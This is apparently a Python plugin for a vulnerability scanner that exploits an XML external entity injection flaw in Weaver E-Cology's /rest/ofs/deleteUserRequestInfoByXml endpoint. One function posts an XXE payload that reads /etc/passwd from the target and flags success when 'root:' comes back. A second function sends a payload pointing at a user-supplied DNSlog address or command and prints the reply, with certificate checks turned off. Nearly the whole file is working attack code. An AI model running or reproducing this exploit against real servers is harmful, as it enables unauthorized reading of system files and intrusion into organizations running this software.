#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '存在exp,传入DNSlog地址或者命令',

      'method'    :   'post',

      'bugname'   :   '泛微E-Cology XML外部实体注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/xml',
      'Accept-Encoding': 'gzip', 
      }
  target = '/rest/ofs/deleteUserRequestInfoByXml'
  data = '''
<?xml version="1.0"?>  
<!DOCTYPE ANY [  
    <!ENTITY % d SYSTEM "file:///etc/passwd">  
    %d;  
]>  
<a>&xxe;</a>


  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret
def exp(url,ua,shell):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/xml',
      'Accept-Encoding': 'gzip', 
      }
  target = '/rest/ofs/deleteUserRequestInfoByXml'
  data = '''
<?xml version="1.0"?>  
<!DOCTYPE ANY [  
    <!ENTITY % d SYSTEM "{shell}">  
    %d;  
]>  
<a>&xxe;</a>


  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    print(res.text)
    res.close()
    return ret
  except:
    print('连接失败') 